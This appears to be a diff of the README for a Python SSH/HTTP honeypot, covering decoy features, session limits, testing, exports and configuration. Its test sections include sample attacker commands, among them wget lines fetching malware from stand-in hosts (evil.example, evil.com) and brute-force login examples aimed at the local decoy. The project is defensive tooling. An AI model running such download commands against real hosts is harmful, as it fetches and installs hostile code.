@@ -1,6 +1,6 @@
 # 🍯 Network Honeypot - SSH/HTTP Decoy System
 
-![Python](https://img.shields.io/badge/python-3.11+-blue.svg)
+![Python](https://img.shields.io/badge/python-3.9+-blue.svg)
 ![License](https://img.shields.io/badge/license-MIT-green.svg)
 ![Status](https://img.shields.io/badge/status-production--ready-success.svg)
 
@@ -11,14 +11,17 @@
 ### ✨ Key Features
 
 - **🎭 Dual Protocol Decoys**
-  - HTTP fake login portal (Flask) on port 8080
-  - SSH interactive shell simulator (Paramiko) on port 2222
+  - HTTP fake login portal (Flask) on port 8080, answers like Apache
+  - SSH server (Paramiko) on port 2222: weak passwords (e.g. `root/root`) "work" and drop the
+    attacker into a fake Ubuntu shell with 40+ commands; every other password is rejected
+  - One-line commands (`ssh host 'uname -a'`) are captured too
   
 - **🔒 Enterprise-Grade Security**
   - Zero command execution (all responses pre-generated)
   - Bcrypt password hashing (never plaintext storage)
   - Thread-safe concurrent session handling
-  - Graceful offline operation
+  - Session limits: 100 open sessions, 5 min idle timeout, 30 min maximum, per-IP rate limit
+  - Graceful offline operation and clean shutdown (Ctrl+C closes every session)
 
 - **📊 Comprehensive Telemetry**
   - UUID-based session tracking
@@ -33,10 +36,10 @@
   - Full-text attack pattern search
 
 - **📈 Analytics Dashboard**
-  - Real-time statistics and charts
-  - Session logs with command playback
-  - Geographic attack heatmap
-  - JSON API for SIEM integration
+  - Live statistics (auto-refresh) and charts: 24 h timeline, attack types, top IPs/usernames/commands
+  - Attack origins by country (GeoIP)
+  - Session list (50 per page, sortable, HTTP/SSH filter) with shell replay
+  - JSON API + JSONL / CSV / MISP exports for SIEM integration
 
 ---
 
@@ -132,59 +135,48 @@ python -m app.main
 ============================================================
 🍯 Network Honeypot - SSH/HTTP Decoy System
 ============================================================
-
-[✓] Configuration validated
-[✓] Data directory: data
-
+  • HTTP decoy:  http://0.0.0.0:8080
+  • SSH decoy:   ssh -p 2222 root@0.0.0.0
+  • Database:    /path/to/network-honeypot/data/honeypot.db
+  • Limits:      100 sessions, idle 300s, max 1800s
 ============================================================
-ACTIVE DECOYS:
-============================================================
-  • HTTP Decoy:  http://0.0.0.0:8080
-  • SSH Decoy:   ssh://0.0.0.0:2222
-
-============================================================
-⚠️  DEPLOYMENT WARNING:
-============================================================
-  • Only deploy on networks you own/have authorization for
-  • Run in isolated environment (DMZ/VLAN)
-  • Monitor logs regularly for novel attack patterns
-  • Captured credentials are sensitive - handle securely
-
+⚠️  Only deploy on networks you own or are authorized to monitor.
+   Run it isolated (DMZ/VLAN) and block outgoing traffic (see README).
 Press Ctrl+C to stop
 ============================================================
-
-[*] Starting HTTP Decoy on 0.0.0.0:8080
-[*] Starting SSH Decoy on 0.0.0.0:2222
-[*] Database: data/honeypot.db
-[*] Fake login portal ready - waiting for attackers...
-[*] Fake SSH shell ready - waiting for attackers...
+... INFO    honeypot.http: HTTP decoy listening on 0.0.0.0:8080 (fake Acme Corp login portal)
+... INFO    honeypot.ssh: SSH decoy listening on 0.0.0.0:2222 (banner SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1, 14 weak passwords accepted)
 ```
+
+Set `DASHBOARD_ENABLED=true` in `.env` to start the dashboard together with the decoys.
+If a port is busy or a setting in `.env` is wrong, the program stops with a clear message.
 
 ### Testing the Installation
 
 **Option 1: Manual Testing**
 
-Open browser to `http://localhost:8080` and try logging in:
-- Username: `admin`
-- Password: `test123`
+Open `http://localhost:8080` in a browser and try to log in (it always fails, but is recorded).
 
-Try SSH connection:
+SSH in with a weak password and type some commands:
 ```bash
 ssh root@localhost -p 2222
-# Password: anything
+# Password: root      (any pair from SSH_ACCEPTED_CREDENTIALS works, e.g. admin/admin)
+whoami
+uname -a
+wget http://evil.example/malware
+exit
 ```
 
-**Option 2: Automated Testing**
+**Option 2: Automated tests (no honeypot needs to be running)**
 
 ```bash
-# In a NEW terminal (keep honeypot running):
-python scripts/test_honeypot.py
+python -m pytest tests -v        # 172 tests: every member's part
 ```
 
-**Option 3: Full Attack Simulation**
+**Option 3: Full Attack Simulation (honeypot running)**
 
 ```bash
-# Comprehensive test with 30+ simulated attacks:
+# 100 attacks: 50 HTTP + 50 SSH (brute force, weak-password shells, one-line commands)
 python scripts/simulate_attacks.py
 ```
 
@@ -197,6 +189,14 @@ python -m app.dashboard.app
 ```
 
 Open browser: `http://localhost:5000`
+(On a Mac, port 5000 is taken by AirPlay Receiver: set `DASHBOARD_PORT=5050` in `.env`.)
+
+**Export the data:**
+```bash
+python scripts/export_logs.py               # JSONL + CSV + MISP into data/exports/
+python scripts/export_logs.py --format misp # just one format
+```
+The same exports are on the dashboard as download links.
 
 **Query Database Directly:**
 ```bash
@@ -228,83 +228,61 @@ SELECT
 ## 📂 Project Structure
 
 ```
-honeypot/
+network-honeypot/
 ├── app/
-│   ├── main.py                      # Entry point - orchestrator
+│   ├── main.py                      # Member 1 - start-up, reaper, shutdown
 │   ├── core/
-│   │   ├── config.py                # Environment configuration
-│   │   ├── session.py               # Session state management
-│   │   └── classifiers.py           # Attack pattern classification
+│   │   ├── config.py                # Member 1 - settings from .env + validation
+│   │   ├── session.py               # Member 1 - shared sessions, limits, timeouts
+│   │   ├── webserver.py             # Member 1 - stoppable web server helper
+│   │   └── classifiers.py           # Member 5 - attack classification + MITRE ATT&CK
 │   ├── decoy_http/
-│   │   └── server.py                # Flask HTTP decoy + routes
+│   │   └── server.py                # Member 2 - fake login portal
 │   ├── decoy_ssh/
-│   │   ├── server.py                # Paramiko SSH server
-│   │   ├── shell.py                 # Interactive shell simulator
-│   │   └── banners.py               # Fake SSH banners/MOTD
+│   │   ├── server.py                # Member 3 - Paramiko SSH server
+│   │   ├── shell.py                 # Member 3 - fake shell (40+ commands)
+│   │   └── banners.py               # Member 3 - SSH banners / MOTD
 │   ├── storage/
-│   │   └── database.py              # SQLite operations
+│   │   ├── database.py              # Member 4 - SQLite (WAL + lock)
+│   │   ├── models.py                # Member 4 - table record types
+│   │   └── exporters.py             # Member 6 - JSONL / CSV / MISP
 │   ├── enrichment/
-│   │   └── ip_lookup.py             # GeoIP enrichment
+│   │   └── ip_lookup.py             # Member 5 - GeoIP + offline fallback
 │   └── dashboard/
-│       ├── app.py                   # Analytics Flask app
-│       └── templates/               # Dashboard HTML
-│           ├── dashboard.html       # Overview page
-│           ├── sessions.html        # Session list
-│           └── session_detail.html  # Detailed session view
+│       ├── app.py                   # Member 6 - dashboard + JSON API
+│       └── templates/               # base, overview, sessions, session detail
 ├── scripts/
-│   ├── test_honeypot.py            # Basic verification tests
-│   └── simulate_attacks.py         # Comprehensive attack simulation
+│   ├── simulate_attacks.py          # Member 7 - 100 simulated attacks
+│   ├── export_logs.py               # Member 6 - export from the command line
+│   ├── setup_geoip.sh               # Member 7 - download MaxMind databases
+│   └── test_honeypot.py             # Member 7 - quick HTTP smoke test
+├── tests/                           # Member 7 - pytest suite (172 tests)
 ├── docs/
-│   ├── ARCHITECTURE.md             # System design deep-dive
-│   └── TEAM_WALKTHROUGH.md         # Code walkthrough for team
-├── data/                           # Runtime data (git-ignored)
-│   ├── honeypot.db                 # SQLite database
-│   └── ssh_host_rsa_key            # Generated SSH host key
-├── requirements.txt                # Python dependencies
-├── .env.example                    # Configuration template
-├── .gitignore                      # Git exclusions
-├── PLAN.md                         # Implementation roadmap
-├── QUICKSTART.md                   # 5-minute guide
-└── README.md                       # This file
+├── data/                            # Runtime data (git-ignored): db, logs, key, exports
+├── install.py                       # One-command setup
+├── requirements.txt
+├── .env.example
+├── CHANGES.md                       # What was fixed, per team member
+└── README.md
 ```
 
 ---
 
 ## 🔧 Configuration
 
-Edit `.env` to customize behavior:
+Copy `.env.example` to `.env` and edit it. Every setting is explained in that file. The most important ones:
 
-```bash
-# HTTP Decoy
-HTTP_DECOY_ENABLED=true
-HTTP_PORT=8080
-HTTP_HOST=0.0.0.0
-
-# SSH Decoy
-SSH_DECOY_ENABLED=true
-SSH_PORT=2222
-SSH_HOST=0.0.0.0
-
-# Database
-DATABASE_PATH=data/honeypot.db
-
-# Session Limits
-MAX_CONCURRENT_SESSIONS=100
-SESSION_IDLE_TIMEOUT_SECONDS=300
-SESSION_MAX_DURATION_SECONDS=1800
-
-# Rate Limiting
-RATE_LIMIT_PER_IP=10
-RATE_LIMIT_WINDOW_SECONDS=60
-
-# IP Enrichment (optional)
-GEOIP_DB_PATH=data/GeoLite2-City.mmdb
-
-# Dashboard
-DASHBOARD_ENABLED=false
-DASHBOARD_PORT=5000
-DASHBOARD_HOST=127.0.0.1
-```
+| Setting | Default | Meaning |
+|---|---|---|
+| `HTTP_PORT` / `SSH_PORT` | 8080 / 2222 | Decoy ports |
+| `SSH_ACCEPTED_CREDENTIALS` | 14 weak pairs | `user:pass` pairs that open the fake shell |
+| `MAX_CONCURRENT_SESSIONS` | 100 | Open sessions allowed (HTTP + SSH together) |
+| `SESSION_IDLE_TIMEOUT_SECONDS` | 300 | SSH attacker logged out after 5 min without typing |
+| `SESSION_MAX_DURATION_SECONDS` | 1800 | Hard limit of 30 min per session |
+| `RATE_LIMIT_PER_IP` | 120 per 60 s | Extra connections from one IP are not logged |
+| `MAX_OUTPUT_BYTES` | 4096 | Longest fake command output |
+| `DASHBOARD_ENABLED` | false | Start the dashboard with `app.main` |
+| `DATABASE_PATH` | data/honeypot.db | Relative paths are inside the project folder |
 
 ---
 
@@ -331,12 +309,15 @@ curl -X POST http://localhost:8080/login \
 ### SSH Attacks
 
 ```bash
-# Brute Force
+# Brute force: wrong passwords are rejected (and logged)
 ssh admin@localhost -p 2222
-# Try passwords: admin, password, 123456
+# Try: password, letmein ...
 
-# Interactive Session (after auth failure, some honeypots still give shell)
-ssh root@localhost -p 2222
+# Weak password: you get the fake shell
+ssh root@localhost -p 2222       # password: root
+
+# One-line command, like bots send
+ssh root@localhost -p 2222 'uname -a; nproc'
 # Commands to test:
 whoami
 uname -a
@@ -357,7 +338,7 @@ wget http://evil.com/malware
 
 **auth_attempts** - Credential capture
 - `attempt_id`, `session_id`, `timestamp`
-- `username`, `password_hash` (bcrypt), `auth_method`, `success` (always 0)
+- `username`, `password_hash` (bcrypt), `auth_method` ('password' | 'form' | 'http_basic' | 'publickey:…'), `success` (1 = weak SSH password let the attacker in)
 
 **interactions** - Commands & HTTP payloads
 - `interaction_id`, `session_id`, `timestamp`, `interaction_type`
